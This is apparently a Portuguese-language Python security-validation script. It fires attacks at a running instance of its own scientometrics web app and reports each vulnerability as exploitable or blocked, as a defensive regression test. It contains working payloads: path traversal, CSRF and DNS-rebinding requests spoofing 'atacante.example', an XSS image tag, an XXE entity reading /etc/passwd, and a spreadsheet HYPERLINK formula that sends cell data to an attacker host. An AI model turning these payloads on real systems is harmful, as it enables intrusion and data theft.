#!/usr/bin/env python3
"""Validação de segurança em CAIXA-PRETA: executa os ataques pela rede contra uma instância
em execução e informa, para cada vulnerabilidade, EXPLORÁVEL ou BLOQUEADO.

Não lê o código da aplicação: o mesmo script é usado antes e depois das correções, o que
permite comparar versões (ver docs/SEGURANCA.md).

Uso:
  python scripts/validacao_seguranca.py --base http://127.0.0.1:8000 [--raiz /caminho/projetos]
         [--base-remota http://<ip-nao-loopback>:8000] [--json saida.json]

--raiz (opcional) pasta de projetos (usada no ataque de traversal V2).
--webroot (opcional) diretório servido pela web, para observar uploads gravados nele (V6).
--base-remota (opcional) é o mesmo servidor acessado por um IP que não é loopback (V4).
Requer: requests; opcional: playwright (V5 — XSS no navegador).
"""
from __future__ import annotations

import argparse
import concurrent.futures as cf
import io
import json
import pathlib
import re
import sys
import tempfile
import time
import zipfile

import requests

RAIZ_REPO = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RAIZ_REPO))
from tests.sinteticos import gerar  # noqa: E402  (dados SINTÉTICOS, sem dados licenciados)

EXPLORAVEL, BLOQUEADO, NA = "EXPLORÁVEL", "BLOQUEADO", "NÃO SE APLICA"


class Cliente:
    """Cliente legítimo: obtém sessão e token CSRF quando a aplicação os oferece."""

    def __init__(self, base, pagina="/"):
        self.base = base
        self.s = requests.Session()
        r = self.s.get(base + pagina, timeout=30)
        m = re.search(r'name="csrf-token" content="([0-9a-f]+)"', r.text)
        self.s.headers.update({"Origin": base})
        if m:
            self.s.headers["X-CSRF-Token"] = m.group(1)

    def api(self, acao, dados=None, **kw):
        if "files" in kw:
            return self.s.post(f"{self.base}/api.php?acao={acao}", data=dados, timeout=600, **kw)
        return self.s.post(f"{self.base}/api.php?acao={acao}", json=dados or {}, timeout=600)


def _projeto(c: Cliente, nome):
    r = c.api("criar_projeto", {"nome": nome})
    return r.json()["projeto"]["slug"]


def _importar_sinteticos(c: Cliente, slug, pasta):
    arqs = [("files[]", (f.name, f.read_bytes())) for f in sorted(pathlib.Path(pasta).glob("*.csv"))]
    return c.api("importar", {"projeto": slug}, files=arqs)


def avaliar(base, raiz=None, base_remota=None, webroot=None):
    res = []

    def reg(codigo, nome, status, evidencia):
        res.append({"id": codigo, "vulnerabilidade": nome, "resultado": status, "evidencia": evidencia})
        print(f"{codigo:4s} {status:14s} {nome} — {evidencia}", flush=True)

    tmp = pathlib.Path(tempfile.mkdtemp(prefix="valseg_"))
    sint = gerar(str(tmp / "sint"))
    c = Cliente(base)
    cr6 = Cliente(base, "/triagem_rapida.php")
    slug = _projeto(c, f"valseg {int(time.time())}")
    _importar_sinteticos(c, slug, sint)
    ex = c.api("executar", {"projeto": slug, "params": {"modo": "original", "n_sensibilidade": 50}}).json()

    # V1 — exposição de arquivos internos pelo servidor
    alvos = [f"/projetos/{slug}/arquivos.json", f"/projetos/{slug}/projeto.json", "/.git/HEAD", "/cientometria/api.py"]
    abertos = [a for a in alvos if requests.get(base + a, timeout=30).status_code == 200]
    reg("V1", "Arquivos internos servidos (projetos/, .git, código)", EXPLORAVEL if abertos else BLOQUEADO,
        f"acessíveis: {abertos}" if abertos else "todos 404")

    # V2 — traversal no identificador do projeto
    r = c.api("projeto", {"projeto": f"../{pathlib.Path(raiz).name}/{slug}" if raiz else f"../projetos/{slug}"})
    ok = r.status_code == 200 and "projeto" in r.json()
    reg("V2", "Path traversal no identificador do projeto", EXPLORAVEL if ok else BLOQUEADO, f"HTTP {r.status_code}")

    # V3 — CSRF: requisição de outro site, sem token, corpo text/plain
    r = requests.post(base + "/api.php?acao=criar_projeto", data='{"nome":"csrf"}', timeout=30,
                      headers={"Content-Type": "text/plain", "Origin": "http://atacante.example"})
    ok = r.status_code == 200 and "projeto" in r.text
    reg("V3", "CSRF / origem não verificada", EXPLORAVEL if ok else BLOQUEADO, f"HTTP {r.status_code}")

    # V4 — acesso de outro computador sem senha
    if base_remota:
        porta_r = base_remota.rsplit(":", 1)[1]
        r1 = requests.get(base_remota + "/", timeout=30)
        # atacante remoto falsificando Host: localhost (contorna a checagem de Host; deve cair na de IP)
        r2 = requests.get(base_remota + "/", headers={"Host": f"localhost:{porta_r}"}, timeout=30)
        ok = 200 in (r1.status_code, r2.status_code)
        reg("V4", "Acesso remoto sem credenciais", EXPLORAVEL if ok else BLOQUEADO,
            f"HTTP {r1.status_code} (Host=IP), {r2.status_code} (Host=localhost falsificado) via {base_remota}")
    else:
        reg("V4", "Acesso remoto sem credenciais", NA, "sem --base-remota")

    # V5 — XSS armazenado (título malicioso numa exportação) — navegador real
    payload_titulo = '<img src=x onerror="window.__xss=1">Flood forecasting with LSTM'
    csv = tmp / "xss" / "lens-export.csv"
    csv.parent.mkdir()
    csv.write_text("Title,Publication Year,Abstract,Keywords,Citing Works Count,DOI,Source Title\n"
                   f'"{payload_titulo.replace(chr(34), chr(34) * 2)}",2020,rainfall river deep learning flood prediction,,3,'
                   "10.1000/xss,W\n", encoding="utf-8")
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            b = p.chromium.launch()
            pg = b.new_page()
            pg.route("https://cdn.jsdelivr.net/**", lambda rt: rt.fulfill(
                path=str(RAIZ_REPO / "vendor" / "chart-4.4.1.umd.js"), content_type="application/javascript"))
            pg.goto(base + "/triagem_rapida.php")
            pg.set_input_files("input[type=file]", str(csv))
            pg.click("#runBtn")
            pg.wait_for_timeout(5000)
            xss = pg.evaluate("() => window.__xss === 1")
            texto = "<img src=x" in (pg.text_content("body") or "")
            b.close()
        reg("V5", "XSS armazenado via título de exportação", EXPLORAVEL if xss else BLOQUEADO,
            "JavaScript do título executou" if xss else f"não executou; exibido como texto={texto}")
    except ImportError:
        reg("V5", "XSS armazenado via título de exportação", NA, "playwright não instalado")

    # V6 — uploads/payload gravados no diretório servido pela web (observado durante o processamento)
    if webroot:
        pasta_web = pathlib.Path(webroot) / "tmp_uploads"
        grande = gerar(str(tmp / "grande"), n=6000)
        arqs = [("files[]", (f.name, f.read_bytes())) for f in sorted(pathlib.Path(grande).glob("*.csv"))]
        vistos = set()
        with cf.ThreadPoolExecutor(1) as pool:
            fut = pool.submit(lambda: cr6.s.post(base + "/run_pipeline.php", data={"engine": "python",
                              "params": '{"modo":"original","n_sensibilidade":0}'}, files=arqs, timeout=600))
            while not fut.done():
                if pasta_web.exists():
                    vistos |= {p.name for p in pasta_web.iterdir() if p.is_file()}
                time.sleep(0.05)
        reg("V6", "Uploads gravados no webroot", EXPLORAVEL if vistos else BLOQUEADO,
            f"{len(vistos)} arquivo(s) em tmp_uploads/ durante o processamento" if vistos else
            "nenhum arquivo em tmp_uploads/ durante o processamento")
    else:
        reg("V6", "Uploads gravados no webroot", NA, "sem --webroot")

    # V7 — binário aceito como CSV
    r = c.api("importar", {"projeto": slug}, files=[("files[]", ("lens-export.csv", b"\x00\x01\x02ELF binario"))])
    ok = r.status_code == 200 and any(a["nome"] == "lens-export.csv" and a["bytes"] < 50 for a in r.json().get("arquivos", []))
    reg("V7", "Upload de conteúdo incompatível com a extensão", EXPLORAVEL if ok else BLOQUEADO, f"HTTP {r.status_code}")

    # V8 — script de terceiros sem versão/SRI
    html = requests.get(base + "/triagem_rapida.php", timeout=30).text
    cdn = re.findall(r'<script[^>]+src="(https?://[^"]+)"[^>]*>', html)
    sem_sri = [u for u in cdn if "integrity=" not in re.search(re.escape(u) + r'"[^>]*>', html).group(0)]
    reg("V8", "Script de CDN sem versão fixa/SRI", EXPLORAVEL if sem_sri else BLOQUEADO, f"{sem_sri or 'nenhum'}")

    # V10 — caminhos absolutos em mensagens de erro
    r = c.api("projeto", {"projeto": "nao-existe-xyz"})
    try:
        msg = str(r.json().get("erro") or r.json().get("error") or r.text)   # decodifica \/ do JSON
    except ValueError:
        msg = r.text
    vaza = bool(re.search(r"/(tmp|home|root|app|dados|var|usr)/", msg))
    reg("V10", "Caminhos absolutos em mensagens de erro", EXPLORAVEL if vaza else BLOQUEADO, msg[:90])

    # H1 — DNS rebinding (Host e Origin do domínio do atacante)
    porta = base.rsplit(":", 1)[1]
    atk = requests.Session()
    p = atk.get(base + "/", headers={"Host": f"atacante.example:{porta}"}, timeout=30)
    tok = re.search(r'csrf-token" content="([0-9a-f]+)"', p.text)
    h = {"Host": f"atacante.example:{porta}", "Origin": f"http://atacante.example:{porta}"}
    if tok:
        h["X-CSRF-Token"] = tok.group(1)
    r = atk.post(base + "/api.php?acao=listar_projetos", json={}, headers=h, timeout=30)
    ok = r.status_code == 200 and "projetos" in r.text
    reg("H1", "DNS rebinding (Host do atacante)", EXPLORAVEL if ok else BLOQUEADO, f"página {p.status_code}, API {r.status_code}")

    # H2 — cliente remoto atrás de proxy reverso local
    r = requests.get(base + "/", headers={"X-Forwarded-For": "203.0.113.9"}, timeout=30)
    reg("H2", "Proxy reverso local dispensa senha", EXPLORAVEL if r.status_code == 200 else BLOQUEADO, f"HTTP {r.status_code}")

    # H3 — triagem rápida sem validação de conteúdo
    cr = Cliente(base, "/triagem_rapida.php")
    xlsx = io.BytesIO()
    with zipfile.ZipFile(xlsx, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("xl/worksheets/sheet1.xml", '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><w>&e;</w>')
    r = cr.s.post(base + "/run_pipeline.php", data={"engine": "python", "params": "{}"}, timeout=120,
                  files={"files[]": ("lens-export.xlsx", xlsx.getvalue())})
    rejeitado = r.status_code == 422 and ("DOCTYPE" in r.text or "inválid" in r.text)
    reg("H3", "Triagem rápida sem validação de conteúdo", BLOQUEADO if rejeitado else EXPLORAVEL,
        f"HTTP {r.status_code}: {r.text[:70]}")

    # H4 — atualizar_projeto sem validação
    r = c.api("atualizar_projeto", {"projeto": slug, "campos": {"nome": "x" * 100000, "slug": "outro"}})
    ok = r.status_code == 200 and len(r.text) > 100000
    reg("H4", "Metadados do projeto sem validação", EXPLORAVEL if ok else BLOQUEADO, f"HTTP {r.status_code}")

    # H5 — injeção de fórmula no XLSX do relatório
    titulo = '=HYPERLINK("http://atacante.example/?d="&A2,"Flood forecasting with LSTM")'
    fc = tmp / "formula" / "lens-export.csv"
    fc.parent.mkdir()
    fc.write_text("Title,Publication Year,Abstract,Keywords,Citing Works Count,DOI,Source Title\n"
                  f'"{titulo.replace(chr(34), chr(34) * 2)}",2020,flood forecasting deep learning rainfall river,,5,10.1000/f1,W\n'
                  '"Flood prediction using random forest",2021,flood forecasting deep learning rainfall river,,1,10.1000/f2,W\n',
                  encoding="utf-8")
    s2 = _projeto(c, f"valseg formula {int(time.time())}")
    c.api("importar", {"projeto": s2}, files=[("files[]", ("lens-export.csv", fc.read_bytes()))])
    e2 = c.api("executar", {"projeto": s2, "params": {"modo": "original", "n_sensibilidade": 0}}).json()
    x = c.s.get(base + "/arquivo.php", params={"projeto": s2, "execucao": e2["pasta"], "caminho": "relatorios/resultados.xlsx"},
                timeout=60)
    import openpyxl
    ws = openpyxl.load_workbook(io.BytesIO(x.content))["corpus"]
    formulas = [cl.coordinate for ln in ws.iter_rows() for cl in ln if cl.data_type == "f"]
    reg("H5", "Injeção de fórmula no XLSX do relatório", EXPLORAVEL if formulas else BLOQUEADO,
        f"células com fórmula: {formulas or 'nenhuma'}")

    # P1 — corrupção do registro por importações simultâneas (via HTTP)
    s3 = _projeto(c, f"valseg concorrencia {int(time.time())}")

    def imp(i):
        cl = Cliente(base)
        conteudo = f"Title,DOI\nflood forecasting {i},10.1000/c{i}\n".encode()
        return cl.api("importar", {"projeto": s3}, files=[("files[]", (f"arq{i}.csv", conteudo))]).status_code

    with cf.ThreadPoolExecutor(16) as pool:
        codigos = list(pool.map(imp, range(96)))
    try:
        n = len(c.api("projeto", {"projeto": s3}).json().get("arquivos", []))
    except ValueError:
        n = -1                                               # registro ilegível
    reg("P1", "Importações simultâneas corrompem o registro", EXPLORAVEL if (n != 96 or codigos.count(200) != 96)
        else BLOQUEADO, f"{codigos.count(200)}/96 respostas 200; {n}/96 registrados "
        "(via HTTP; o servidor limita a concorrência ao nº de workers do PHP)")
    # V9 — custo ilimitado (n_sensibilidade) — por último, porque na versão vulnerável o servidor fica ocupado
    try:
        r = c.s.post(f"{base}/api.php?acao=executar", timeout=60,
                     json={"projeto": slug, "params": {"modo": "original", "n_sensibilidade": 10 ** 7}})
        n = r.json()["diagnosticos"]["sensibilidade_pesos"]["n"]
        reg("V9", "Sorteios de sensibilidade sem limite", EXPLORAVEL if n == 10 ** 7 else BLOQUEADO, f"n efetivo = {n}")
    except requests.Timeout:
        reg("V9", "Sorteios de sensibilidade sem limite", EXPLORAVEL,
            "10⁷ sorteios aceitos: requisição ainda processando após 60 s")
    except (KeyError, ValueError, TypeError) as e:
        reg("V9", "Sorteios de sensibilidade sem limite", BLOQUEADO, f"recusado ({type(e).__name__})")
    return {"base": base, "execucao_ok": bool(ex.get("manifesto")), "resultados": res}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    ap.add_argument("--raiz")
    ap.add_argument("--base-remota")
    ap.add_argument("--webroot", help="diretório servido pela web (para observar tmp_uploads/)")
    ap.add_argument("--json")
    a = ap.parse_args()
    out = avaliar(a.base.rstrip("/"), a.raiz, a.base_remota, a.webroot)
    if a.json:
        pathlib.Path(a.json).write_text(json.dumps(out, ensure_ascii=False, indent=1), encoding="utf-8")
    exploraveis = [r["id"] for r in out["resultados"] if r["resultado"] == EXPLORAVEL]
    print(f"\nEXPLORÁVEIS: {exploraveis or 'nenhuma'}")
    return 1 if exploraveis else 0


if __name__ == "__main__":
    sys.exit(main())
